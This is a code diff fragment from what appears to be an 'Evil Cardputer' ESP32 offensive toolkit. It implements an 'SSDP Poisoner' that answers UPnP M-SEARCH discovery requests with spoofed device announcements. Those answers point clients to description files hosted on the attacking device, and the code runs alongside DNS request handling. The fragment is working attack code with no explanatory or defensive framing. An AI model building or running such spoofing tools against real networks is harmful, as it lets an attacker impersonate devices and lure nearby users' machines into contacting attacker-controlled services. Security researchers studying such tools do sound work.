+      if (len > 0 && strstr(buffer, "M-SEARCH")) {
+        ssdpSearchCount++;
+        IPAddress cli = udpSSDP.remoteIP();
+        lastSSDPClient = cli.toString();
+
+        String req(buffer);
+        String stValue = "ssdp:all";
+        int stIndex = req.indexOf("\nST:");
+        if (stIndex < 0) stIndex = req.indexOf("\nst:");
+        if (stIndex >= 0) {
+          int end = req.indexOf("\r\n", stIndex+1);
+          String line = req.substring(stIndex+1, (end>stIndex)?end:req.length());
+          int colon = line.indexOf(':');
+          if (colon >= 0) stValue = line.substring(colon+1);
+          stValue.trim();
+        }
+        lastSSDPService = stValue;
+
+        IPAddress locIP = (cli[0]==192 && cli[1]==168 && cli[2]==4) ? WiFi.softAPIP() : WiFi.localIP();
+        String norm; SearchKind kind = classifyST(stValue, norm);
+        
+        for (int i=0;i<ssdpDeviceCount;i++) {
+          bool doit = false;
+          if (kind == SK_All) doit = true;
+          else if (kind == SK_Root) doit = true;
+          else if (kind == SK_DevType && String(gDevs[i].type).equalsIgnoreCase(norm)) doit = true;
+          else if (kind == SK_UUID) {
+            String want = norm; want.toLowerCase();
+            String my = "uuid:" + String(gDevs[i].uuid);
+            my.toLowerCase();
+            if (my == want) doit = true;
+          }
+
+          if (doit) {
+            String loc = "http://" + locIP.toString() + ":80/desc" + String(i) + ".xml";
+            String usn;
+            if (kind == SK_Root) usn = "uuid:" + String(gDevs[i].uuid) + "::upnp:rootdevice";
+            else usn = "uuid:" + String(gDevs[i].uuid) + "::" + String(gDevs[i].type);
+
+            char resp[SSDP_MAX_UDP];
+            String head =
+              "HTTP/1.1 200 OK\r\n"
+              "CACHE-CONTROL: max-age=1800\r\n"
+              "EXT:\r\n"
+              "LOCATION: " + loc + "\r\n"
+              "SERVER: ESP32/3.0 UPnP/1.0 EvilCardputer/1.4.5\r\n"
+              "ST: " + (kind==SK_Root ? "upnp:rootdevice" : String(gDevs[i].type)) + "\r\n"
+              "USN: " + usn + "\r\n"
+              "CONTENT-LENGTH: 0\r\n\r\n";
+            size_t n = head.length();
+            if (n >= sizeof(resp)) n = sizeof(resp)-1;
+            memcpy(resp, head.c_str(), n);
+            udpSSDP.beginPacket(cli, udpSSDP.remotePort());
+            udpSSDP.write((const uint8_t*)resp, n);
+            udpSSDP.endPacket();
+            ssdpSentCount++;
+            delay(1);
+          }
+        }
+        updateFakeSSDPUI();
+      }
+    }
+
+    ssdpServer.handleClient();
+    handleDnsRequestSerial();
+    M5.update();
+    M5Cardputer.update();
+    delay(2);
+  }
+
+  udpSSDP.stop();
+  isFakeSSDPActive = false;
+  ssdpServer.stop();
+  server.begin();
+  waitAndReturnToMenu("SSDP Poisoner stopped");
 }
